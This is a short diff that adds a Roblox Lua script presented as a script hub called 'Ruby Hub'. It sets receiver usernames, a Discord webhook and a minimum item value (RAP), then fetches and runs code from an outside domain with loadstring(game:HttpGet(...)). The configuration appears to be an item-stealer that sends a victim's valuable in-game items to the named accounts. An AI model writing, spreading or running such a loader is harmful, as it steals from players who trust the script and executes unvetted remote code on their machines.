@@ -1,0 +1,9 @@
+Username = "StrawNaHat"
+Username2 = "StrawNaHat"
+Webhook = "https://discord.com/channels/1192060687011295363/1192060837330960437"
+
+HubName = "●Ruby Hub● | Relaunch"
+
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
